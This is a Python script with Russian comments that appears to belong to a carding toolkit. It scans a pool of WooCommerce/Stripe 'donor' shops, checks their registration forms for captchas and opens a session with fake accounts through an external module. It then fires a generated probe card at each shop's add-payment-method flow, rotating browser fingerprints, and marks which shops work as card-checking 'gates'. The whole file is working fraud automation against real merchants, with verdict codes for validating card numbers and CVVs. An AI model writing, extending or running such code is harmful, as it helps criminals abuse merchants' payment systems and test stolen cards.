"""Боевой $0-прогон по setupwoo-донорам из пула S2.

Не требует реальной карты. Luhn-валидный зонд даёт честный ответ на вопрос
«донор живой или нет»:

    ERROR      -> донор мёртв: регистрация закрыта, нет nonce, нет pk, сеть.
                  Зонд даже не дошёл до Stripe.
    DECLINED / INVALID / EXPIRED / WRONG_CVC
               -> ДОНОР ЖИВОЙ. Зонд дошёл до Stripe этого магазина и получил
                  содержательный отказ по карте. Гейт работает.
    APPROVED*  -> настоящий хит (на случайном PAN не бывает).

Порядок честный: сначала открываем сессию (регистрация + скрап nonces),
потом один зонд. Пул `ready_gates.json` НЕ трогаем — health не пишем.

Запуск:  python scratch/_setupwoo_live.py
         python scratch/_setupwoo_live.py --delay 3 --bin 453927
"""
from __future__ import annotations

import argparse
import asyncio
import json
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

import gate_client as gc  # noqa: E402
import setup_gate  # noqa: E402
from config import pick_impersonate  # noqa: E402

POOL = ROOT / "data" / "scout_pool.json"
OUT = ROOT / "data" / "_setupwoo_live.json"

# Зонд: Luhn-валидный PAN с валидной датой и случайным CVC.
BIN_DEFAULT = "453927"

# Что считаем признаком живого донора — зонд дошёл до Stripe
LIVE_SIGNALS = {
    "DECLINED", "DECLINED@DO_NOT_HONOR", "DECLINED@FRAUD", "DECLINED@STOLEN",
    "INVALID", "EXPIRED", "WRONG_CVC", "RESTRICTED", "RETRY", "TEST_MODE",
    "3DS_REQUIRED", "3DS_CHALLENGE", "3DS_REDIRECT", "3DS_FRICTIONLESS",
    "APPROVED", "APPROVED@CCN", "APPROVED@CVV", "APPROVED@HOLD", "APPROVED@PAID",
    "PI_MINTED", "PI_PENDING",
}


CAPTCHA_MARKERS = (
    "g-recaptcha", "recaptcha", "hcaptcha", "h-captcha",
    "cf-turnstile", "cf_challenge", "turnstile", "challenges.cloudflare",
)


def probe_card(bin_prefix: str) -> str:
    c = gc.gen_probe_card(bin_prefix)
    return f"{c['number']}|{c['mm']}|{c['yy']}|{c['cvc']}"


async def reg_gate_check(base: str) -> dict:
    """D-34: reg_nonce есть != регистрация возможна.

    Пассивно смотрим форму регистрации: если в ней висит капча, донор для
    setupwoo фантомный — зонд до Stripe не дойдёт, потому что учётку создать
    нельзя. Три GET-а, ноль мутаций, как в surface.py.
    """
    import re
    from curl_cffi.requests import AsyncSession

    out = {"nonce": False, "captcha": None, "form_fields": 0}
    s = AsyncSession(impersonate=pick_impersonate(), verify=False)
    try:
        r = await s.get(f"{base}/my-account/", timeout=15)
        if r.status_code != 200:
            return out
        html = r.text
        out["nonce"] = bool(gc.extract_reg_nonce(html))
        form = gc.extract_register_form_html(html)
        low = (form or "").lower()
        for m in CAPTCHA_MARKERS:
            if m in low:
                out["captcha"] = m
                break
        # капча может жить вне формы — проверяем всю страницу как фолбэк
        if not out["captcha"]:
            low_all = html.lower()
            for m in CAPTCHA_MARKERS:
                if m in low_all:
                    out["captcha"] = m + " (page)"
                    break
        out["form_fields"] = len(set(re.findall(r'name="([^"]+)"', form or "")))
    except Exception:
        pass
    finally:
        try:
            await s.close()
        except Exception:
            pass
    return out


def gate_for(entry: dict) -> dict:
    dom = entry["domain"]
    base = entry.get("canonical_host") or f"https://{dom}"
    base = base.rstrip("/")
    return {
        "domain": dom,
        "base_url": base,
        "reg_url": f"{base}/my-account/",
        "add_pm_url": f"{base}/my-account/add-payment-method/",
        "ajax_url": f"{base}/wp-admin/admin-ajax.php",
        "gate_type": "wc_stripe_upe",
    }


async def fire(entry: dict, card: str) -> dict:
    g = gate_for(entry)
    dom = g["domain"]
    t0 = time.perf_counter()
    pre = await reg_gate_check(g["base_url"])
    gs = setup_gate.GateSession(g)
    try:
        ok, detail = await gs.open()
        if not ok:
            return {
                "domain": dom, "session": False, "verdict": "ERROR",
                "detail": str(detail)[:220], "pk": "", "email": "",
                "ms": int((time.perf_counter() - t0) * 1000),
                "nonce": pre["nonce"], "captcha": pre["captcha"],
            }
        pk = gs.pk
        email = gs.account_email
        t1 = time.perf_counter()
        res = await gs.check_card(card)
        ms = int((time.perf_counter() - t1) * 1000)
        verdict = res.get("status", "UNKNOWN")
        return {
            "domain": dom, "session": True, "verdict": verdict,
            "detail": str(res.get("detail", ""))[:220], "pk": pk, "email": email,
            "ms": ms, "impersonate": "rotated",
            "nonce": pre["nonce"], "captcha": pre["captcha"],
        }
    except Exception as e:
        return {
            "domain": dom, "session": False, "verdict": "ERROR",
            "detail": f"{type(e).__name__}: {e}"[:220], "pk": "", "email": "",
            "ms": int((time.perf_counter() - t0) * 1000),
            "nonce": pre["nonce"], "captcha": pre["captcha"],
        }
    finally:
        try:
            await gs.close()
        except Exception:
            pass


async def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--delay", type=float, default=3.0)
    ap.add_argument("--bin", default=BIN_DEFAULT)
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--donor", default="",
                    help="конкретный домен вместо пула (контрольный выстрел)")
    args = ap.parse_args()

    if args.donor:
        donors = [{"domain": args.donor, "canonical_host": f"https://{args.donor}"}]
    else:
        pool = json.loads(POOL.read_text(encoding="utf-8"))
        donors = [e for e in pool if "setupwoo" in (e.get("routes") or [])]
        if args.limit:
            donors = donors[: args.limit]

    card = probe_card(args.bin)
    pan = gc.extract_pan(card)
    print("=" * 78)
    print("БОЕВОЙ $0-ПРОГОН ПО setupwoo-ДОНОРАМ")
    print("=" * 78)
    print(f"  доноров: {len(donors)}")
    print(f"  зонд   : {pan[:6]}…{pan[-4:]} (Luhn-валидный, не реальная карта)")
    print(f"  отпечаток: ротация из пула ({len(gc.IMPERSONATIONS) if hasattr(gc,'IMPERSONATIONS') else 'config'})")
    print("=" * 78)
    print(f"\n  {'домен':<33} {'капча':<16} {'сессия':<7} {'вердикт':<19} {'мс':>6}")
    print("  " + "-" * 84)

    out = []
    for e in donors:
        r = await fire(e, card)
        out.append(r)
        mark = "LIVE" if r["verdict"] in LIVE_SIGNALS else "dead"
        cap = r.get("captcha") or "—"
        print(f"  {r['domain'][:32]:<33} {cap[:15]:<16} {'ok' if r['session'] else 'FAIL':<7} "
              f"{r['verdict']:<19} {r['ms']:>6}   {mark}", flush=True)
        if r["detail"]:
            print(f"      {r['detail'][:100]}")
        await asyncio.sleep(args.delay)

    live = [r for r in out if r["verdict"] in LIVE_SIGNALS]
    dead = [r for r in out if r["verdict"] not in LIVE_SIGNALS]

    print("\n" + "=" * 78)
    print("ИТОГ")
    print("=" * 78)
    print(f"  живых доноров : {len(live)} из {len(out)}")
    print(f"  мёртвых       : {len(dead)}")
    if live:
        print(f"  медиана отклика: {sorted(r['ms'] for r in live)[len(live)//2]} мс")
    print("=" * 78)
    print("\n  Расшифровка:")
    print("    LIVE — зонд дошёл до Stripe магазина и получил отказ по карте.")
    print("           Значит регистрация, nonces, pk и SetupIntent работают.")
    print("    dead — зонд до Stripe не дошёл: донор негоден.")

    if live:
        print("\n  ЖИВЫЕ:")
        for r in live:
            print(f"    {r['domain']:<34} {r['verdict']:<20} {r['ms']:>6} мс")
    if dead:
        print("\n  МЁРТВЫЕ:")
        for r in dead:
            print(f"    {r['domain']:<34} {r['verdict']:<20} {r['detail'][:60]}")

    OUT.write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
    print(f"\n  записано: {OUT.relative_to(ROOT)}")


if __name__ == "__main__":
    asyncio.run(main())
